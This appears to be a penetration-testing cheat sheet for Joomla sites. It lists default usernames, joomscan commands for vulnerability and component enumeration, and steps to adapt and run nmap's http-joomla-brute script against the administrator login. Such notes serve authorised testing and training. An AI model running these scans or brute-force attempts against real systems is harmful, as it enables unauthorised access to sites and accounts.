# Joomla

### 1) Default users

    joomla
    admin

### 2) Scan Joomla for information and vulnerabilities

    joomscan --url http://domain.local/joomla

Enumerate components

    joomscan --url http://domain.local/joomla -ec

### 3) Brute force Joomla administrator page

#### Nmap

Create a users wordlist

    joomla
    admin

Modify the http-joomla-brute.nse script to be used (if joomla installation is not in webroot)

    sudo nano /usr/share/nmap/scripts/http-joomla-brute.nse

Modify the specific line:

    local DEFAULT_JOOMLA_LOGIN_URI = "/joomla/administrator/index.php"

Run the attack

    nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=wordlist.txt' IP
